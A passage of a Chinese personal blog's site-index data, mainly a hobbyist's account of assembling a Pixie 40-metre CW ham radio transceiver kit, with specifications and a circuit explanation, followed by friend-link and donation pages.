9~13.8V的直流电源供电，此机非常早流行于国外，后经国内爱好者引入，皮鞋是PIXIE的音译。\n2、主要指标\n电源：DC9~13.8V（推荐采用电池或线性稳压电源），不区分正负极 天线：50欧姆，7MHz，驻波比2.0以下 接收静态电流：20mA 发射电流：120mA 发射功率：1.2W 频率：发射本振频率：7023KHz；接收本振频率：约 7023-7026KHz 工作模式：CW 电键：手动键 自动发报：不支持 外壳：拼装、全包 侧音：无\n3、电路原理\n参见本文档末页附图原理图，9018与周围件构成了典型的考毕兹振荡器并且一直保 持振荡（故在接收时有1mW 左右振荡信号泄漏），本振信号通过电容直接耦合到8050。在发射状态下（电键按下），8050作 为C类功放，放大后的信号经100nF电容耦合到π型低通滤波器，然后送天线发射；在接收状态下（电键放开），9018与周 围件构成差拍振荡器（BFO），1N4001加上高电压，容性随两端的直流电压升高而降低，本振频率可升高约0-3KHz,能方便 地对7.023MHz接收信号进行拍频。8050被偏置在非线性区（可以这么想，三极管无非就是背对背接着的两个二极管嘛！）， 将天线接收的信号与BFO的信号进行混频，混频得到的音频信号经过0.1uF电容耦合送到LM386构成的音频功率放大器，放大 后的音频信号在LM386 的5脚经10uF电容隔直后送耳机。电键不但控制LM386电源的通断，也切换D2变容管的偏置，使之容量 在不同的状态下变化。\nLXQQFY.com 电路原理图\n","permalink":"https://www.papernote.cn/posts/2019-07-20-%E5%88%B6%E4%BD%9Cs-pixie%E7%9A%AE%E9%9E%8Bcw%E6%97%A0%E7%BA%BF%E7%94%B5%E6%94%B6%E5%8F%91%E6%8A%A5%E6%9C%BA/","summary":"开箱！ 收到了快递，立马将快递盒大卸八块。\n一个简陋的塑封袋\n所有组件一览\n亚克力板材质的外壳\n准备工作 家境贫寒，真的\n纸莫的工作台（简陋）\n为电阻排序\n为电容排序\n一些其他的零部件\n焊接过程 烙铁真烫手\n先将电阻安装进孔\n电阻焊接完成\n然后将瓷片电容？安装进孔\n一些其他的东西\n处理三极管的针脚\n将三极管安装到位\n全桥整流器！！！\n安装一些大的组件的照片找不到了还行。。。\n但是我记得，那个电感有多恶心！\n安装完成！\n塞进外壳\n电台测评（雾） 我所制作的是来自某宝的神奇科技，工作频率7023KHz，听说网上一些火腿用这个成功联通浙江和沈阳，但是我觉得这个收发报机并没太大实用价值，灵敏度低，收发不能同频 ，关键是天线很长 ，就算是使用1:4的巴轮，天线的总长度也要达到20.25M（我家屋顶放不下），所以现阶段我无法对这台设备进行调试，更别提测评了????。\n我以后尽量补齐????。\n一些文献 以下内容来自互联网，如有侵权，请联系我删除\n1、简介\n皮鞋是一个体积非常小巧的简易 40米波段微功率等幅电报收发信机，使用 9~13.8V的直流电源供电，此机非常早流行于国外，后经国内爱好者引入，皮鞋是PIXIE的音译。\n2、主要指标\n电源：DC9~13.8V（推荐采用电池或线性稳压电源），不区分正负极 天线：50欧姆，7MHz，驻波比2.0以下 接收静态电流：20mA 发射电流：120mA 发射功率：1.2W 频率：发射本振频率：7023KHz；接收本振频率：约 7023-7026KHz 工作模式：CW 电键：手动键 自动发报：不支持 外壳：拼装、全包 侧音：无\n3、电路原理\n参见本文档末页附图原理图，9018与周围件构成了典型的考毕兹振荡器并且一直保 持振荡（故在接收时有1mW 左右振荡信号泄漏），本振信号通过电容直接耦合到8050。在发射状态下（电键按下），8050作 为C类功放，放大后的信号经100nF电容耦合到π型低通滤波器，然后送天线发射；在接收状态下（电键放开），9018与周 围件构成差拍振荡器（BFO），1N4001加上高电压，容性随两端的直流电压升高而降低，本振频率可升高约0-3KHz,能方便 地对7.023MHz接收信号进行拍频。8050被偏置在非线性区（可以这么想，三极管无非就是背对背接着的两个二极管嘛！）， 将天线接收的信号与BFO的信号进行混频，混频得到的音频信号经过0.1uF电容耦合送到LM386构成的音频功率放大器，放大 后的音频信号在LM386 的5脚经10uF电容隔直后送耳机。电键不但控制LM386电源的通断，也切换D2变容管的偏置，使之容量 在不同的状态下变化。\nLXQQFY.com 电路原理图","title":"制作S-Pixie（皮鞋）cw无线电收发报机"},{"content":"欢迎各位和我交换友情链接！\n没做评论区呢，可以发我邮箱 现在你可以发评论区了 咕咕咕，markdown没法施展得开呢 这里是我的朋友们：\nzsqw123 保持可爱 💖! 何言的杂货店 专业写 Bug 的苦逼大学生一枚 (博主自评) CXPLAY World Share With You. Axton 无垠：飞翔的天空无限大 Createlite 同情自己是卑劣懦夫做的勾当 Chimon的黑板报 这个人很懒，什么也没留下 吴先森的笔记 为退烧而生！ gggxbbb Just so so\u0026hellip; (博主自评) Future_Maker_Blog 永远打不败的，是你想要的自己。 snote 资源管理器？ Future_Maker_Blog 永远打不败的，是你想要的自己。 ","permalink":"https://www.papernote.cn/friends/","summary":"友链","title":"友情链接"},{"content":"请尽量在备注里写上联系方式\n支付宝 微信 null undefined 很遗憾，这里什么也没有\n","permalink":"https://www.papernote.cn/donate/","summary":"赞助","title":"赞助 \u0026 鸣谢"}]